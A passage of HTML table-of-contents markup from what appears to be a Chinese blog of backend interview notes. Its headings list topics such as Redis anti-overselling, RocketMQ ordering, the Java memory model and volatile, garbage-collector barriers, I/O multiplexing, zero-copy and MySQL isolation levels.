href="#%E2%9C%85-%E4%B8%BE%E4%BE%8B%E5%8C%BA%E5%88%86%E7%90%86%E8%A7%A3%EF%BC%9A"><span class="toc-text">✅ 举例区分理解：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#12306%E6%88%96%E7%B1%BB%E4%BC%BC%E9%AB%98%E5%B9%B6%E5%8F%91%E8%B4%AD%E7%A5%A8%E7%B3%BB%E7%BB%9F%E4%B8%AD%E9%98%B2%E6%AD%A2%E4%BD%99%E7%A5%A8%E8%B6%85%E5%8D%96%E7%9A%84%E4%B8%80%E7%A7%8D%E6%A0%B8%E5%BF%83%E5%81%9A%E6%B3%95"><span class="toc-text">12306或类似高并发购票系统中防止余票超卖的一种核心做法</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E2%80%9C%E5%9F%BA%E4%BA%8E-Redis-%E7%9A%84%E4%BB%A4%E7%89%8C%E5%AE%B9%E5%99%A8-Lua-%E8%84%9A%E6%9C%AC%E6%8E%A7%E5%88%B6%E7%9A%84%E5%BA%93%E5%AD%98%E5%9E%8B%E9%99%90%E6%B5%81%E2%80%9D%E6%96%B9%E6%A1%88"><span class="toc-text">✅ “基于 Redis 的令牌容器 + Lua 脚本控制的库存型限流”方案</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A9-%E4%B8%80%E3%80%81%E9%97%AE%E9%A2%98%E8%83%8C%E6%99%AF%EF%BC%9A%E9%AB%98%E5%B9%B6%E5%8F%91%E5%9C%BA%E6%99%AF%E4%B8%8B%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2%E4%BD%99%E7%A5%A8%E8%B6%85%E5%8D%96%EF%BC%9F"><span class="toc-text">🧩 一、问题背景：高并发场景下如何防止余票超卖？</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A7%A0-%E4%BA%8C%E3%80%81%E6%A0%B8%E5%BF%83%E6%80%9D%E8%B7%AF%EF%BC%9A%E5%BC%95%E5%85%A5%E2%80%9C%E4%BB%A4%E7%89%8C%E5%AE%B9%E5%99%A8%E2%80%9D%E5%81%9A%E5%BA%93%E5%AD%98%E4%BB%A4%E7%89%8C%E6%8E%A7%E5%88%B6"><span class="toc-text">🧠 二、核心思路：引入“令牌容器”做库存令牌控制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-%E4%BB%A4%E7%89%8C%E5%AE%B9%E5%99%A8%E6%98%AF%E4%B8%80%E4%B8%AA-Redis-Hash-%E7%BB%93%E6%9E%84%EF%BC%8C%E7%BB%93%E6%9E%84%E5%A6%82%E4%B8%8B%EF%BC%9A"><span class="toc-text">✅ 令牌容器是一个 Redis Hash 结构，结构如下：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%9B%A0%EF%B8%8F-%E4%B8%89%E3%80%81%E8%B4%AD%E7%A5%A8%E6%B5%81%E7%A8%8B%E5%88%86%E4%B8%BA%E5%87%A0%E4%B8%AA%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-text">🛠️ 三、购票流程分为几个步骤：</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-1-%E6%9F%A5%E8%AF%A2%E6%89%80%E9%9C%80%E5%8C%BA%E9%97%B4%E5%AF%B9%E5%BA%94%E7%9A%84%E6%89%80%E6%9C%89%E7%9B%B8%E5%85%B3%E5%86%B2%E7%AA%81%E5%8C%BA%E9%97%B4%EF%BC%88%E5%A6%82%E8%B4%AD%E4%B9%B0-%E6%B5%8E%E5%8D%97%E8%A5%BF-%E2%86%92-%E6%9D%AD%E5%B7%9E%E4%B8%9C%EF%BC%89"><span class="toc-text">✅ 1. 查询所需区间对应的所有相关冲突区间（如购买 济南西 → 杭州东）</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-2-%E6%9F%A5%E8%AF%A2-Redis-%E4%B8%AD%E8%BF%99%E4%BA%9B%E5%AD%97%E6%AE%B5%E7%9A%84%E5%80%BC%E6%98%AF%E5%90%A6%E9%83%BD-%E2%89%A5-1"><span class="toc-text">✅ 2. 查询 Redis 中这些字段的值是否都 ≥ 1</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-3-%E4%BD%BF%E7%94%A8-Lua-%E8%84%9A%E6%9C%AC%E5%81%9A%E5%8E%9F%E5%AD%90%E6%80%A7%E6%89%A3%E5%87%8F"><span class="toc-text">✅ 3. 使用 Lua 脚本做原子性扣减</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%9C%85-4-%E6%88%90%E5%8A%9F%E6%89%A3%E5%87%8F%E5%90%8E%E8%BF%9B%E5%85%A5%E4%B8%8B%E6%B8%B8%E6%B5%81%E7%A8%8B"><span class="toc-text">✅ 4. 成功扣减后进入下游流程</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%93%8C-%E6%9C%80%E5%90%8E%E6%80%BB%E7%BB%93%E4%B8%80%E6%AE%B5%E8%AF%9D%EF%BC%8C%E4%BD%9C%E4%B8%BA%E9%9D%A2%E8%AF%95%E6%A0%87%E5%87%86%E7%AD%94%E9%A2%98%E8%AF%AD%EF%BC%9A"><span class="toc-text">📌 最后总结一段话，作为面试标准答题语：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RocketMQ-%E7%9A%84%E9%A1%BA%E5%BA%8F%E6%80%A7"><span class="toc-text">RocketMQ 的顺序性</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E4%B8%89%E3%80%81%E9%9D%A2%E8%AF%95%E4%B8%AD%E6%A0%87%E5%87%86%E7%AD%94%E6%B3%95%EF%BC%88%E5%90%AB%E6%89%A9%E5%B1%95%EF%BC%89"><span class="toc-text">✅ 三、面试中标准答法（含扩展）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9D%93-%E9%9D%A2%E8%AF%95%E5%AE%98%E9%97%AE%EF%BC%9A%E2%80%9CRocketMQ-%E6%80%8E%E4%B9%88%E4%BF%9D%E8%AF%81%E9%A1%BA%E5%BA%8F%E6%B6%88%E8%B4%B9%EF%BC%9F%E2%80%9D"><span class="toc-text">❓ 面试官问：“RocketMQ 怎么保证顺序消费？”</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%9B%9E%E7%AD%94%E6%A8%A1%E6%9D%BF%EF%BC%88%E7%AE%80%E6%B4%81-%E6%8A%80%E6%9C%AF%E7%82%B9%E5%85%A8%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ 回答模板（简洁 + 技术点全）：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%A8%E6%88%B7%E4%B8%8B%E5%8D%95%E5%90%8E%E5%BC%82%E6%AD%A5%E6%89%A3%E5%BA%93%E5%AD%98%E7%9A%84%E8%BF%87%E7%A8%8B"><span class="toc-text">用户下单后异步扣库存的过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E5%9C%BA%E6%99%AF%EF%BC%9A%E7%94%A8%E6%88%B7%E4%B8%8B%E5%8D%95%E5%90%8E%E5%BC%82%E6%AD%A5%E6%89%A3%E5%BA%93%E5%AD%98%EF%BC%88%E5%90%AB-Broker-%E5%AE%95%E6%9C%BA%E5%BA%94%E5%AF%B9%EF%BC%89"><span class="toc-text">✅ 场景：用户下单后异步扣库存（含 Broker 宕机应对）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%92%A1-%E4%B8%9A%E5%8A%A1%E6%B5%81%E7%A8%8B%E8%AF%B4%E6%98%8E"><span class="toc-text">💡 业务流程说明</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E7%94%A8%E6%88%B7%E4%B8%8B%E5%8D%95%E6%88%90%E5%8A%9F"><span class="toc-text">1. 用户下单成功</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E5%B8%B8%E6%B5%81%E7%A8%8B"><span class="toc-text">✅ 正常流程</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Producer-%E5%8F%91%E9%80%81%E6%B6%88%E6%81%AF%EF%BC%9A"><span class="toc-text">Producer 发送消息：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E5%BC%82%E5%B8%B8%E6%83%85%E5%86%B5%E4%B8%80%EF%BC%9AConsumer-%E5%BC%82%E5%B8%B8"><span class="toc-text">✅ 异常情况一：Consumer 异常</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E9%9D%A2%E8%AF%95%E7%AD%94%E9%A2%98%E6%A8%A1%E6%9D%BF%EF%BC%88%E6%8E%A8%E8%8D%90%E8%83%8C%E8%AF%B5%E7%89%88%EF%BC%89"><span class="toc-text">✅ 面试答题模板（推荐背诵版）</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-text">牛客</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#JVM%E5%86%85%E5%AD%98%E6%A8%A1%E5%9E%8BJMM"><span class="toc-text">JVM内存模型JMM</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%8D-%E9%80%9A%E4%BF%97%E7%90%86%E8%A7%A3"><span class="toc-text">🔍 通俗理解</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%B1-JMM-%E8%A7%A3%E5%86%B3%E4%BA%86%E4%BB%80%E4%B9%88%E9%97%AE%E9%A2%98%EF%BC%9F"><span class="toc-text">🧱 JMM 解决了什么问题？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-1-%E5%8F%AF%E8%A7%81%E6%80%A7"><span class="toc-text">✅ 1. 可见性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-2-%E5%8E%9F%E5%AD%90%E6%80%A7"><span class="toc-text">✅ 2. 原子性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-3-%E6%9C%89%E5%BA%8F%E6%80%A7"><span class="toc-text">✅ 3. 有序性</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%AD-%E6%80%BB%E7%BB%93%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%9A"><span class="toc-text">🧭 总结一句话：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9D%97-%E9%97%AE%E9%A2%98%E6%98%AF%EF%BC%9AB%E7%BA%BF%E7%A8%8B%E5%88%B0%E5%BA%95%E4%BC%9A%E4%B8%8D%E4%BC%9A%E8%B7%B3%E5%87%BA%E5%BE%AA%E7%8E%AF%EF%BC%9F"><span class="toc-text">❗ 问题是：B线程到底会不会跳出循环？</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E7%A1%AE%E7%AD%94%E6%A1%88%EF%BC%9A"><span class="toc-text">✅ 正确答案：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%A4%AF-%E4%B8%BA%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="toc-text">🤯 为什么？</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E7%A1%AE%E5%86%99%E6%B3%95%EF%BC%88%E5%8A%A0-volatile-%E4%BF%9D%E8%AF%81%E5%8F%AF%E8%A7%81%E6%80%A7%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ 正确写法（加 volatile 保证可见性）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%92%A1-volatile-%E7%9A%84%E4%BD%9C%E7%94%A8%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">💡 volatile 的作用总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%84-%E8%A1%A5%E5%85%85%EF%BC%9A%E6%8C%87%E4%BB%A4%E9%87%8D%E6%8E%92%E7%9A%84%E9%A3%8E%E9%99%A9%E5%9C%BA%E6%99%AF%EF%BC%88%E5%8F%8C%E9%87%8D%E6%A3%80%E6%9F%A5%E5%8D%95%E4%BE%8B%EF%BC%89"><span class="toc-text">🔄 补充：指令重排的风险场景（双重检查单例）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%81-%E4%BB%80%E4%B9%88%E6%98%AF%E6%8C%87%E4%BB%A4%E9%87%8D%E6%8E%92%EF%BC%88Instruction-Reordering%EF%BC%89"><span class="toc-text">🔁 什么是指令重排（Instruction Reordering）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%91%87-%E4%B8%BE%E4%BE%8B%EF%BC%9A%E5%8F%8C%E9%87%8D%E6%A3%80%E6%9F%A5%E9%94%81%EF%BC%88DCL%EF%BC%89%E5%86%99%E6%B3%95%EF%BC%88%E4%B8%8D%E5%AE%89%E5%85%A8%E7%89%88%E6%9C%AC%EF%BC%89"><span class="toc-text">👇 举例：双重检查锁（DCL）写法（不安全版本）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8F-%E9%97%AE%E9%A2%98%E5%85%B3%E9%94%AE%EF%BC%9Ainstance-new-Singleton-%E5%8F%AF%E8%83%BD%E4%BC%9A%E8%A2%AB%E9%87%8D%E6%8E%92%E5%BA%8F%E4%B8%BA%E4%BB%A5%E4%B8%8B%E4%B8%89%E4%B8%AA%E6%AD%A5%E9%AA%A4%EF%BC%9A"><span class="toc-text">⚠️ 问题关键：instance &#x3D; new Singleton() 可能会被重排序为以下三个步骤：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8F-%E9%87%8D%E6%8E%92%E5%90%8E%E5%AE%9E%E9%99%85%E9%A1%BA%E5%BA%8F%E5%8F%AF%E8%83%BD%E6%98%AF%EF%BC%9A"><span class="toc-text">⚠️ 重排后实际顺序可能是：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9D%8C-%E7%BA%BF%E7%A8%8B-B-%E5%8F%AF%E8%83%BD%E7%9C%8B%E5%88%B0%E2%80%9C%E6%9C%AA%E5%88%9D%E5%A7%8B%E5%8C%96%E2%80%9D%E7%9A%84%E5%AF%B9%E8%B1%A1%EF%BC%81"><span class="toc-text">❌ 线程 B 可能看到“未初始化”的对象！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%AD%A3%E7%A1%AE%E5%86%99%E6%B3%95%EF%BC%9A%E5%8A%A0-volatile-%E7%A6%81%E6%AD%A2%E9%87%8D%E6%8E%92"><span class="toc-text">✅ 正确写法：加 volatile 禁止重排</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E6%80%BB%E7%BB%93%E4%B8%80%E5%8F%A5%E8%AF%9D%EF%BC%9A-5"><span class="toc-text">✅ 总结一句话：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AA%E8%A6%81-instance-%E6%8C%87%E5%90%91%E4%BA%86%E4%B8%80%E4%B8%AA%E5%9C%B0%E5%9D%80%EF%BC%88%E5%8D%B3%E5%86%85%E5%AD%98%E5%B7%B2%E5%88%86%E9%85%8D%EF%BC%89%EF%BC%8C%E5%AE%83%E5%B0%B1%E4%B8%8D%E4%B8%BA-null%EF%BC%81"><span class="toc-text">只要 instance 指向了一个地址（即内存已分配），它就不为 null！</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E8%83%8C%E5%90%8E%E5%8E%9F%E7%90%86%EF%BC%88JVM-%E6%8C%87%E4%BB%A4%E9%87%8D%E6%8E%92%E5%BA%8F%EF%BC%89"><span class="toc-text">🧠 背后原理（JVM 指令重排序）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8F-%E6%AD%A3%E5%B8%B8%E9%A1%BA%E5%BA%8F%EF%BC%88%E6%B2%A1%E8%A2%AB%E9%87%8D%E6%8E%92%EF%BC%89%EF%BC%9A"><span class="toc-text">⚠️ 正常顺序（没被重排）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9A%A0%EF%B8%8F-%E8%A2%AB%E9%87%8D%E6%8E%92%E5%BA%8F%E7%9A%84%E9%A1%BA%E5%BA%8F%EF%BC%88%E4%B8%8D%E5%8A%A0-volatile-%E7%9A%84%E6%83%85%E5%86%B5%E4%B8%8B%E5%8F%AF%E8%83%BD%E5%8F%91%E7%94%9F%EF%BC%89%EF%BC%9A"><span class="toc-text">⚠️ 被重排序的顺序（不加 volatile 的情况下可能发生）：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9B%94-%E6%AD%A4%E6%97%B6%E7%BA%BF%E7%A8%8B-B-%E8%BF%9B%E6%9D%A5%E4%BA%86%EF%BC%9A"><span class="toc-text">⛔ 此时线程 B 进来了：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%80%BB%E7%BB%93%EF%BC%9A"><span class="toc-text">🧠 一句话总结：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E7%AE%97%E6%B3%95"><span class="toc-text">垃圾回收算法</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E5%9C%BA%E6%99%AF%E8%AE%BE%E5%AE%9A-2"><span class="toc-text">🎯 场景设定</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A9-%E4%B8%80%E3%80%81%E6%B2%A1%E6%9C%89%E5%B1%8F%E9%9A%9C%E5%8F%AF%E8%83%BD%E5%87%BA%E9%94%99%E7%9A%84%E5%9C%B0%E6%96%B9"><span class="toc-text">🧩 一、没有屏障可能出错的地方</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%9B%A1%EF%B8%8F-%E4%BA%8C%E3%80%81%E8%AF%BB%E5%B1%8F%E9%9A%9C%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%88ZGC%EF%BC%89"><span class="toc-text">🛡️ 二、读屏障的工作原理（ZGC）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%A7-ZGC-%E7%9A%84%E5%81%9A%E6%B3%95%EF%BC%9A"><span class="toc-text">🔧 ZGC 的做法：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%9B%A1%EF%B8%8F-%E4%B8%89%E3%80%81%E5%86%99%E5%B1%8F%E9%9A%9C%E7%9A%84%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86%EF%BC%88G1%EF%BC%89"><span class="toc-text">🛡️ 三、写屏障的工作原理（G1）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%A7-G1-%E7%9A%84%E5%81%9A%E6%B3%95%EF%BC%9A"><span class="toc-text">🔧 G1 的做法：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%AA-%E5%9B%9B%E3%80%81%E4%BB%A3%E7%A0%81-%E5%86%85%E5%AD%98%E8%A1%8C%E4%B8%BA%E7%A4%BA%E6%84%8F"><span class="toc-text">🧪 四、代码 + 内存行为示意</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#IO%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%EF%BC%88epoll%E3%80%81select%E3%80%81poll%E7%9A%84%E5%8C%BA%E5%88%AB%EF%BC%89"><span class="toc-text">IO多路复用（epoll、select、poll的区别）</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%9A%A6-%E4%B8%80%E3%80%81%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81-I-O-%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%EF%BC%9F"><span class="toc-text">🚦 一、为什么需要 I&#x2F;O 多路复用？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%A7%A0-%E4%BA%8C%E3%80%81I-O-%E5%A4%9A%E8%B7%AF%E5%A4%8D%E7%94%A8%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86"><span class="toc-text">🧠 二、I&#x2F;O 多路复用核心原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9B%B6%E6%8B%B7%E8%B4%9D%EF%BC%88%E8%BF%99%E9%87%8C%E7%9A%84sendfile%E4%B9%9F%E5%8F%AF%E5%BA%94%E7%94%A8%E4%BA%8Ekafka%E3%80%81Netty%E3%80%81Nginx%EF%BC%9Bmmap%E5%BA%94%E7%94%A8%E4%BA%8ERocketMQ%EF%BC%89"><span class="toc-text">零拷贝（这里的sendfile也可应用于kafka、Netty、Nginx；mmap应用于RocketMQ）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E4%BC%A0%E7%BB%9F%E7%9A%84IO%E6%A8%A1%E5%BC%8F%EF%BC%9A"><span class="toc-text">一、传统的IO模式：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E4%BB%80%E4%B9%88%E6%98%AF%E9%9B%B6%E6%8B%B7%E8%B4%9D%EF%BC%9A"><span class="toc-text">二、什么是零拷贝：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81mmap-write-%E5%AE%9E%E7%8E%B0%E7%9A%84%E9%9B%B6%E6%8B%B7%E8%B4%9D%EF%BC%9A"><span class="toc-text">1、mmap + write 实现的零拷贝：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E3%80%81sendfile-%E5%AE%9E%E7%8E%B0%E7%9A%84%E9%9B%B6%E6%8B%B7%E8%B4%9D%EF%BC%9A"><span class="toc-text">2、sendfile 实现的零拷贝：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E5%B8%A6-DMA-%E6%94%B6%E9%9B%86%E6%8B%B7%E8%B4%9D%E5%8A%9F%E8%83%BD%E7%9A%84-sendfile-%E5%AE%9E%E7%8E%B0%E7%9A%84%E9%9B%B6%E6%8B%B7%E8%B4%9D%EF%BC%9A"><span class="toc-text">3、带 DMA 收集拷贝功能的 sendfile 实现的零拷贝：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RocketMQ-%E4%B8%BB%E8%A6%81%E4%BD%BF%E7%94%A8%E7%9A%84%E6%98%AF-mmap-%E5%AE%9E%E7%8E%B0%E9%9B%B6%E6%8B%B7%E8%B4%9D%EF%BC%8C%E8%80%8C%E4%B8%8D%E5%83%8F-Kafka-%E9%82%A3%E6%A0%B7%E4%B8%BB%E8%A6%81%E4%BE%9D%E8%B5%96-sendfile"><span class="toc-text">RocketMQ 主要使用的是 mmap 实现零拷贝，而不像 Kafka 那样主要依赖 sendfile</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-%E9%9D%A2%E8%AF%95%E4%B8%80%E8%AF%AD%E6%80%BB%E7%BB%93%EF%BC%88%E6%8E%A8%E8%8D%90%E8%AE%B0%E6%B3%95%EF%BC%89%EF%BC%9A"><span class="toc-text">✅ 面试一语总结（推荐记法）：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#RR%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB%E4%B8%8B%EF%BC%8Creadview%E5%92%8C%E9%94%81%E6%9C%BA%E5%88%B6%E5%A6%82%E4%BD%95%E5%87%8F%E5%B0%91%E5%B9%BB%E8%AF%BB%E7%9A%84%E5%8F%91%E7%94%9F%E7%9A%84"><span class="toc-text">RR隔离级别下，readview和锁机制如何减少幻读的发生的</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8B%E5%8A%A1-A-%E5%BC%80%E5%90%AF%EF%BC%8C%E5%B9%B6%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2"><span class="toc-text">✅ 事务 A 开启，并进行查询</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8B%E5%8A%A1-B-%E6%8F%92%E5%85%A5%E4%B8%80%E6%9D%A1%E6%BB%A1%E8%B6%B3%E6%9D%A1%E4%BB%B6%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%8C%E5%B9%B6%E6%8F%90%E4%BA%A4"><span class="toc-text">✅ 事务 B 插入一条满足条件的数据，并提交</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8B%E5%8A%A1-A-%E5%86%8D%E6%AC%A1%E6%9F%A5%E8%AF%A2"><span class="toc-text">✅ 事务 A 再次查询</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%94%90-%E5%9C%BA%E6%99%AF%E4%BA%8C%EF%BC%9ANext-Key-Lock%EF%BC%88%E5%8A%A0%E9%94%81%E6%9F%A5%E8%AF%A2-SELECT-%E2%80%A6-FOR-UPDATE%EF%BC%89"><span class="toc-text">🔐 场景二：Next-Key Lock（加锁查询 SELECT … FOR UPDATE）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8B%E5%8A%A1-A-%E5%8A%A0%E9%94%81%E6%9F%A5%E8%AF%A2%EF%BC%9A"><span class="toc-text">✅ 事务 A 加锁查询：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8B%E5%8A%A1-B-%E8%AF%95%E5%9B%BE%E6%8F%92%E5%85%A5%E4%B8%80%E6%9D%A1%E8%AE%B0%E5%BD%95%EF%BC%9A"><span class="toc-text">✅ 事务 B 试图插入一条记录：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%9C%85-%E4%BA%8B%E5%8A%A1-A-%E6%8F%90%E4%BA%A4"><span class="toc-text">✅ 事务 A 提交</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9B%9B%E7%A7%8D%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB"><span class="toc-text">四种隔离级别</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-1-Read-Uncommitted%EF%BC%88%E8%AF%BB%E6%9C%AA%E6%8F%90%E4%BA%A4%EF%BC%89%F0%9F%91%8E%E6%9C%80%E5%BC%B1"><span class="toc-text">✅ 1. Read Uncommitted（读未提交）👎最弱</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%8D-%E7%A4%BA%E4%BE%8B%EF%BC%9A"><span class="toc-text">🔍 示例：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-2-Read-Committed%EF%BC%88%E8%AF%BB%E5%B7%B2%E6%8F%90%E4%BA%A4%EF%BC%89%F0%9F%94%B9Oracle-%E9%BB%98%E8%AE%A4"><span class="toc-text">✅ 2. Read Committed（读已提交）🔹Oracle 默认</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%8D-%E7%A4%BA%E4%BE%8B%EF%BC%88%E4%B8%8D%E5%8F%AF%E9%87%8D%E5%A4%8D%E8%AF%BB%EF%BC%89%EF%BC%9A"><span class="toc-text">🔍 示例（不可重复读）：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-3-Repeatable-Read%EF%BC%88%E5%8F%AF%E9%87%8D%E5%A4%8D%E8%AF%BB%EF%BC%89%F0%9F%94%B0MySQL-InnoDB-%E9%BB%98%E8%AE%A4"><span class="toc-text">✅ 3. Repeatable Read（可重复读）🔰MySQL InnoDB 默认</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%8D-%E7%A4%BA%E4%BE%8B%EF%BC%88%E5%B9%BB%E8%AF%BB%EF%BC%89%EF%BC%9A"><span class="toc-text">🔍 示例（幻读）：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E2%9C%85-4-Serializable%EF%BC%88%E5%8F%AF%E4%B8%B2%E8%A1%8C%E5%8C%96%EF%BC%89%F0%9F%94%92%E6%9C%80%E5%BC%BA"><span class="toc-text">✅ 4. Serializable（可串行化）🔒最强</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%F0%9F%94%8D-%E7%A4%BA%E4%BE%8B%EF%BC%9A-2"><span class="toc-text">🔍 示例：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%F0%9F%8E%AF-%E9%9D%A2%E8%AF%95%E6%8A%80%E5%B7%A7%E6%80%BB%E7%BB%93%EF%BC%88%E4%BD%A0%E5%8F%AF%E4%BB%A5%E8%BF%99%E6%A0%B7%E7%AD%94%EF%BC%89%EF%BC%9A"><span class="toc-text">🎯 面试技巧总结（你可以这样答）：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" 